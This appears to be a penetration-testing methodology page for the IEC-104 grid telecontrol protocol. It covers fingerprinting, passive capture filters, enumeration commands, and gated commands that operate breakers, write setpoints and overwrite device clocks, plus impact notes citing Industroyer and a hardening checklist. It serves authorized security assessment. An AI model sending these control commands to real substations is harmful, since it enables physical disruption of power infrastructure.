# IEC 60870-5-104 — implementation methodology

Companion router: [[ics|ICS area router]]. IEC-104 is the TCP telecontrol protocol between
control centres and RTUs/IEDs in European and Asian electric grids (plus water, rail traction,
district heating). Plaintext 2404/tcp, no authentication, no encryption, no integrity: any host
that completes the handshake can read the full process state and, where control points are
reachable, operate breakers. This is the protocol Industroyer was built to speak.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| TESTFR/STARTDT liveness | none | yes | Confirms 2404 is really IEC-104 — Info |
| General interrogation (Type 100) | none | yes | Full point/IOA inventory — High |
| Station scan (CASDU 1–254) | none | yes | Which stations answer — Med |
| Control commands (Types 45/46/49/50) | **authorization only** | yes | Breaker/switch operation — Critical, gated |
| Spoofed telemetry (`M_*`, COT=3) | none | on-path/master-side | False measurements to SCADA — High |
| STOPDT / clock abuse | **authorization only** | yes | Blind the master / corrupt timelines — High |
| 62351-3 TLS (19998) | TLS deployed | no | Rare; check plaintext 2404 sibling |

## Phase 0 — Fingerprint (the handshake gate)

```bash
nmap -p 2404 -sV --open 198.51.100.10
nmap -p 2404 --script iec-identify 198.51.100.10
nmap -p 19998 --script ssl-enum-ciphers 198.51.100.10    # 62351-3 TLS variant, if present
```

Framing fact that decides your probes: an APDU starts with a 6-byte **APCI** (start `0x68`,
length, four control octets) carrying an optional **ASDU**. Three formats: **I** (numbered data,
the only ASDU carrier), **S** (supervisory ACK), **U** (link control: `STARTDT`, `STOPDT`,
`TESTFR`). **A bare TCP connect proves nothing** — the master must send `STARTDT act` and receive
`STARTDT con` before the outstation emits data. `iec-identify` (discovery + intrusive) runs the
handshake and a general interrogation for you; classify any port that only completes TCP as
unknown until a valid I/U/S frame comes back.

## Phase 1 — Passive recon

A tap on the master-to-RTU link hands over the station addresses, the live point map, and the
control history before you send a frame:

```bash
iec60870_104                          # all APCI frames
iec60870_104.type == 0x00             # I-format only (ASDU carriers)
iec60870_asdu.typeid == 45            # C_SC_NA_1 single command (control)
iec60870_asdu.typeid == 46            # C_DC_NA_1 double command (control)
iec60870_asdu.typeid == 100           # general interrogation (state dumps)
iec60870_asdu.causetx == 3            # spontaneous telemetry updates
```

The oida scanner's pcap mode (`oida pcap capture.pcap --protocols iec104`; `--protocols ics`
for every ICS listener at once) splits controlling from controlled stations, lists Common
Addresses and type IDs per session, decodes IOA ranges with quality flags, and flags control
operations and STARTDT/STOPDT session changes.

## Phase 2 — Read-only enumeration

Address model first: an ASDU is `TypeID | VSQ | COT | OA | CASDU | IOA | value`. The **CASDU**
(common address) selects the station/sector; the **IOA** selects the point inside it. There are
no human-readable names — a point is a number pair, which is why interrogation is always the
first move and why Industroyer2 shipped with per-station CASDU/IOA lists hardcoded by hand.
Types to know: monitoring `M_*` (1 single-point, 13 short-float), control `C_*` (45 single
command, 46 double command, 50 float setpoint; 49 scaled setpoint), system 100 interrogation /
101 counter / 102 read / 103 clock sync / 105 reset process.

```bash
oida iec104 198.51.100.10                    # TESTFR/STARTDT liveness
oida iec104 198.51.100.10 -S                 # station scan: probe CASDUs 1-254
oida iec104 198.51.100.10 -I                 # general interrogation -> full IOA map
oida iec104 198.51.100.10 -G                 # group interrogation 1-16 (quieter)
oida iec104 198.51.100.10 -R 100,200,300     # targeted C_RD_NA_1 point reads
oida iec104 198.51.100.10 -C                 # counter interrogation (integrated totals)
oida iec104 198.51.100.10 --probe-files      # file-transfer capability (types 120-127)
oida iec104 198.51.100.10 -X                 # vendor/private type IDs 128-255
```

Install extra is `oida-ics[iec104]`. Useful knobs: `-a` auto-discovers the CASDU, `-c` pins it,
`--originator` sets the (unauthenticated, spoofable) originator byte, `--tls` with
`--tls-cert`/`--tls-key` for the 62351-3 variant on 19998, `--t1`/`--t3` for slow outstations.
For manual work the reference stack is lib60870 via its c104 Python binding — `c104.Client()`,
`add_connection(...)`, `add_station(common_address=...)`, `add_point(io_address=...,
type=c104.Type.C_SC_NA_1)`, and a full server mode for offline reproduction of findings. Type
must match the point or the outstation answers with an error COT (44–47: unknown type/cause/
CASDU/IOA).

## Phase 3 — Control validation (gated)

Every control-direction message is a physical grid operation; the oida module gates all of them
behind `--confirm`:

```bash
oida iec104 198.51.100.10 --test-commands --test-command-ioa 100 --confirm   # least destructive
oida iec104 198.51.100.10 -W 100:on --confirm              # C_SC_NA_1 single command
oida iec104 198.51.100.10 --write-double 100:off --confirm # C_DC_NA_1
oida iec104 198.51.100.10 --write-float 200:1.5 --confirm  # C_SE_NC_1 setpoint
oida iec104 198.51.100.10 -W 100:on --select-execute --confirm  # SBO variant
```

- **`--test-commands`** probes whether commands are accepted at an IOA without actuating —
  start there, under authorization.
- **Select-Before-Operate is an interlock, not a control** — `--select-execute` just sends
  Select then Execute, which is exactly what an attacker does.
- **The clock read is a clock write**: `C_CS_NA_1` (type 103) reports the device clock and
  overwrites it as a side effect, desynchronising every CP56Time2a-tagged event. It is
  `--confirm`-gated for that reason.
- Broadcast `CASDU=0xFFFF`, where a stack honours it, fans one command across every outstation.

## Phase 4 — Impact framing (what this protocol is famous for)

The realistic impact set, all protocol-native: unauthenticated full-state read (GI), unauth
breaker operation (types 45/46), spoofed telemetry (`M_*` with COT=3 accepted by masters as
genuine changes), master blinding (STOPDT from an unexpected source halts spontaneous
reporting), timeline corruption (clock writes), and replay (no anti-replay on non-time-tagged
command types where 62351-5 is absent). Industroyer/CrashOverride (2016) ran TESTFR → STARTDT →
GI → command flips in a Ukrainian substation; Industroyer2 (2022) collapsed it to hardcoded
per-station payloads. ATT&CK for ICS: T1692.001 command messages, T1692.002 reporting
messages, T0848 rogue master, T0830 adversary-in-the-middle.

Hardening check worth reporting: outstations restricted to their registered master IP,
CASDU=0xFFFF rejected, 62351-3 TLS + 62351-5 challenge-response actually enabled — their
absence is the finding you just proved.

## Command quick reference

```bash
nmap -p 2404 --script iec-identify 198.51.100.10     # handshake + interrogation

```
